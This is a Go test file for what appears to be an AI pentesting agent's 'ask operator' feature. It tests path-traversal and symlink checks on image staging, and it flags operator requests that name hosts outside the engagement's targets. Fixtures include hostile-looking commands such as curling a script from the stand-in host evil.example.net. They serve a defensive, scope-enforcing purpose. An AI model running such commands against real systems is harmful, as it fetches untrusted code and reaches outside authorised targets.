package server

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Autumn-27/artex/intercept"
)

func TestStageAskOperatorImage(t *testing.T) {
	dir := t.TempDir()
	taskDir := filepath.Join(dir, "tasks", "7")
	if err := os.MkdirAll(taskDir, 0o755); err != nil {
		t.Fatal(err)
	}
	src := filepath.Join(taskDir, "shot.png")
	if err := os.WriteFile(src, []byte("fakepng"), 0o644); err != nil {
		t.Fatal(err)
	}

	// no image -> no attachment
	att, err := stageAskOperatorImage(dir, "7", "")
	if err != nil || att != nil {
		t.Fatalf("empty src: att=%v err=%v", att, err)
	}

	// relative path from the task working directory (worker CWD)
	att, err = stageAskOperatorImage(dir, "7", "shot.png")
	if err != nil || len(att) != 1 {
		t.Fatalf("valid src: att=%v err=%v", att, err)
	}
	if !strings.HasPrefix(att[0].Path, "uploads/ask-operator-") || !strings.HasSuffix(att[0].Path, ".png") {
		t.Fatalf("unexpected attachment path %q", att[0].Path)
	}
	if _, err := os.Stat(filepath.Join(taskDir, "uploads", att[0].Name)); err != nil {
		t.Fatalf("copy missing: %v", err)
	}

	// absolute path still accepted when it stays inside the task dir
	att, err = stageAskOperatorImage(dir, "7", src)
	if err != nil || len(att) != 1 {
		t.Fatalf("absolute inside task dir: att=%v err=%v", att, err)
	}

	// wrong extension rejected
	bad := filepath.Join(taskDir, "payload.exe")
	if err := os.WriteFile(bad, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := stageAskOperatorImage(dir, "7", "payload.exe"); err == nil || !strings.Contains(err.Error(), "png/jpg") {
		t.Fatalf("expected extension rejection, got %v", err)
	}

	// missing file rejected
	if _, err := stageAskOperatorImage(dir, "7", "nope.png"); err == nil {
		t.Fatal("expected missing-file rejection")
	}

	outside := filepath.Join(dir, "outside.png")
	if err := os.WriteFile(outside, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := stageAskOperatorImage(dir, "7", filepath.Join("..", "..", "outside.png")); err == nil {
		t.Fatal("expected .. rejection")
	}
	if _, err := stageAskOperatorImage(dir, "7", outside); err == nil {
		t.Fatal("expected outside-path rejection")
	}

	otherDir := filepath.Join(dir, "tasks", "8")
	if err := os.MkdirAll(otherDir, 0o755); err != nil {
		t.Fatal(err)
	}
	other := filepath.Join(otherDir, "shot.png")
	if err := os.WriteFile(other, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := stageAskOperatorImage(dir, "7", other); err == nil {
		t.Fatal("expected other-task rejection")
	}

	link := filepath.Join(taskDir, "link.png")
	if err := os.Symlink(outside, link); err != nil {
		t.Logf("symlink test skipped: %v", err)
	} else if _, err := stageAskOperatorImage(dir, "7", "link.png"); err == nil {
		t.Fatal("expected symlink-out rejection")
	}
}

// The emitted activity must carry the {text, attachments} Detail shape the
// transcript parser expects, so the operator sees the question with the
// attachment card for the screenshot.
func TestAskOperatorActivityShape(t *testing.T) {
	att := []chatAttachment{{Name: "ask-operator-1.png", Path: "uploads/ask-operator-1.png", Size: 7}}
	a := userActivityWithAttachments("worker", "OPERATOR INPUT REQUESTED: solve the captcha", att)
	if a.Kind != "user" || a.Worker != "worker" {
		t.Fatalf("unexpected activity kind/worker: %+v", a)
	}
	var parsed struct {
		Text        string           `json:"text"`
		Attachments []chatAttachment `json:"attachments"`
	}
	if err := json.Unmarshal([]byte(a.Detail), &parsed); err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(parsed.Text, "OPERATOR INPUT REQUESTED") || len(parsed.Attachments) != 1 || parsed.Attachments[0].Path != att[0].Path {
		t.Fatalf("unexpected detail payload: %+v", parsed)
	}
}

// F12: a host the question names outside the goal targets tags the request;
// a host of the goal, written alone or inside a URL, does not.
func TestTargetDerivedHosts(t *testing.T) {
	goal := commandTargets("Test https://app.example.com/login and 10.0.0.5:8080 for auth bypass")
	bare := goalTargets("Find auth bypass on app.example.com; success = a request that reads another user's profile")
	cases := []struct {
		name     string
		question string
		goal     []intercept.Target
		want     []string
	}{
		{"in-goal host", "Please run: nc -v 10.0.0.5:8443 and paste the banner", goal, nil},
		{"out-of-goal host", "Please run: curl -s http://evil.example.net/x.sh and paste the output", goal, []string{"evil.example.net"}},
		{"URL with an in-goal host", "Run curl -sk https://app.example.com/api/v2/me?id=1 in your terminal", goal, nil},
		{"empty goal list tags any host", "Run curl -sk https://app.example.com/api/v2/me", nil, []string{"app.example.com"}},
		{"no host", "Enter the 6-digit code sent to the test account", goal, nil},
		{"URL with a bare-domain goal host", "Run curl -sk https://app.example.com:8443/api/v2/me in your terminal", bare, nil},
		{"out-of-goal host with a bare-domain goal", "Please run: curl -s http://evil.example.net/x.sh and paste the output", bare, []string{"evil.example.net"}},
	}
	for _, c := range cases {
		got := targetDerivedHosts(c.question, c.goal)
		if strings.Join(got, ",") != strings.Join(c.want, ",") {
			t.Errorf("%s: got %v, want %v", c.name, got, c.want)
		}
	}
}

// The tag is a field of the Detail payload: the text stays the question, and an
// untagged request without a screenshot keeps its plain-text form.
func TestAskOperatorActivityTag(t *testing.T) {
	text := "OPERATOR INPUT REQUESTED: run curl http://evil.example.net/"
	if a := askOperatorActivity(text, nil, nil); a.Detail != "" || a.Summary != text {
		t.Fatalf("untagged request changed: %+v", a)
	}
	a := askOperatorActivity(text, nil, []string{"evil.example.net"})
	var parsed struct {
		Text               string           `json:"text"`
		Attachments        []chatAttachment `json:"attachments"`
		TargetDerivedHosts []string         `json:"target_derived_hosts"`
	}
	if err := json.Unmarshal([]byte(a.Detail), &parsed); err != nil {
		t.Fatal(err)
	}
	if parsed.Text != text || a.Summary != text || parsed.Attachments == nil || len(parsed.TargetDerivedHosts) != 1 {
		t.Fatalf("unexpected tagged payload: %s", a.Detail)
	}
}

// The tool description must tell agents what to do on environmental blocks:
// hand the operator one copy-pastable command instead of retrying or hunting
// for bypasses. Pattern adapted from bug-bounty-hunting-prompts (MIT).
func TestAskOperatorEnvHandoffGuidance(t *testing.T) {
	desc := (&Server{}).toolAskOperator().Description()
	for _, marker := range []string{"copy-pastable", "do not retry or work around"} {
		if !strings.Contains(desc, marker) {
			t.Errorf("ask_operator description missing env-handoff marker %q", marker)
		}
	}
}
